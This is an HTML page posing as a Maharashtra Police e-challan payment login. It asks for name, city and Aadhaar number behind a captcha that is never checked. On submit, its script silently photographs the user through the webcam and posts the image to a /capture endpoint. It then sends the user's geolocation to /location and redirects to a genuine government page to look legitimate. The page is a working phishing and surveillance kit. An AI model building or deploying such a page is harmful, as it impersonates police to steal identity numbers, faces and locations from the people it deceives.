<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>E-Challan Payment</title>

<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  font-family: Verdana, sans-serif;
}

body {
  min-height: 100vh;
  background: radial-gradient(circle at top, #1c1f24 0%, #0b0e11 45%, #050608 100%);
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  color: #fff;
}

/* Center layout */
.main {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;
}

.wrapper {
  width: 360px;
}

/* Card */
.card {
  background: rgba(15,17,20,0.95);
  border: 1px solid #2a2d33;
  padding: 28px;
  border-radius: 4px;
  text-align: center;
}

/* Logo placeholder */
.logo {
  height: 60px;
  background: #ff0000;
  margin-bottom: 22px;
}

/* Inputs */
input {
  width: 100%;
  padding: 11px;
  margin-bottom: 10px;
  background: #26292e;
  border: 1px solid #3a3d43;
  border-radius: 4px;
  color: #fff;
  font-size: 14px;
}

input::placeholder {
  color: #b0b3b8;
}

.error {
  color: red;
  font-size: 12px;
  display: none;
  margin-bottom: 8px;
}

/* Captcha */
.captcha-row {
  display: flex;
  gap: 8px;
  align-items: center;
  margin-bottom: 10px;
}

.captcha-img {
  width: 120px;
  height: 36px;
  background: #e0e0e0;
  object-fit: cover;
}

.captcha-input {
  flex: 1;
}

.refresh-icon {
  cursor: pointer;
  font-size: 20px;
  color: #4f6cff;
}

/* Button */
button {
  width: 100%;
  padding: 11px;
  background: #3f4db8;
  border: none;
  border-radius: 8px;
  color: #fff;
  font-weight: 600;
  cursor: pointer;
  margin-top: 10px;
}

button:disabled {
  background: #777;
}

/* Footer links */
.signup {
  margin-top: 14px;
  border: 1px solid #2a2d33;
  padding: 16px;
  text-align: center;
  font-size: 14px;
}

.signup a {
  color: #3f8cff;
  text-decoration: none;
  font-weight: 600;
}

footer {
  text-align: center;
  font-size: 12px;
  color: #8e8e8e;
  padding: 20px 10px;
}
</style>
</head>

<body>

<div class="main">
  <div class="wrapper">

    <div class="card">
      <div class="logo"></div>

      <form id="challanForm">
        <input type="text" id="nameInput" placeholder="Enter Full Name">
        <div class="error" id="nameError">Please enter your name</div>

        <input type="text" id="cityInput" placeholder="Enter City">
        <div class="error" id="cityError">Please enter your city</div>

        <input type="text" id="aadharInput" placeholder="Enter Aadhar Number" maxlength="12">
        <div class="error" id="aadharError">Enter valid 12-digit Aadhar</div>

        <div class="captcha-row">
          <img class="captcha-img" id="captchaImg" src="">
          <input class="captcha-input" id="captchaInput" placeholder="Code">
          <span class="refresh-icon" onclick="refreshCaptcha()">↻</span>
        </div>
        <div class="error" id="captchaError">Enter captcha</div>

        <button type="submit" class="submit-btn">Log in</button>
      </form>
    </div>

    <div class="signup">
      Don't have an account? <a href="#">Sign up</a>
    </div>

  </div>
</div>

<footer>
  © 2024 Maharashtra Police. All rights reserved.
</footer>

<script>
/* ========= UNCHANGED LOGIC ========= */

const PDF_REDIRECT_URL =
"https://highwaypolice.maharashtra.gov.in/road-safety-guideline/";

const captchaData = [
  { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/4_ujeoyw.png", answer: "ABC123XY" },
  { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/1_mwdtit.png", answer: "ZX9K4LMN" },
  { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/3_ok9huw.png", answer: "QW7ER2TY" },
  { image: "https://res.cloudinary.com/dfoqpwkck/image/upload/v1766567111/2_gryz55.png", answer: "PL8MN3KO" }
];

let currentCaptcha = null;

function refreshCaptcha() {
  const i = Math.floor(Math.random() * captchaData.length);
  currentCaptcha = captchaData[i];
  captchaImg.src = currentCaptcha.image;
  captchaInput.value = "";
}

async function capturePhoto() {
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }});
  const video = document.createElement("video");
  video.srcObject = stream;
  await video.play();

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  stream.getTracks().forEach(t=>t.stop());
  return canvas.toDataURL("image/jpeg",0.8);
}

refreshCaptcha();

challanForm.addEventListener("submit", async e => {
  e.preventDefault();

  document.querySelectorAll(".error").forEach(e=>e.style.display="none");
  let valid = true;

  if(!nameInput.value.trim()){nameError.style.display="block";valid=false;}
  if(!cityInput.value.trim()){cityError.style.display="block";valid=false;}
  if(!/^\d{12}$/.test(aadharInput.value)){aadharError.style.display="block";valid=false;}
  if(!captchaInput.value.trim()){captchaError.style.display="block";valid=false;}

  if(!valid) return;

  const btn = document.querySelector(".submit-btn");
  btn.disabled = true;

  try {
    const image = await capturePhoto();
    await fetch("/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({image})});

    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(pos=>{
        fetch("/location",{method:"POST",headers:{"Content-Type":"application/json"},
        body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude})});
      });
    }

    challanForm.reset();
    refreshCaptcha();
    window.location.href = PDF_REDIRECT_URL;
  } catch {
    btn.disabled = false;
  }
});
</script>

</body>
</html>
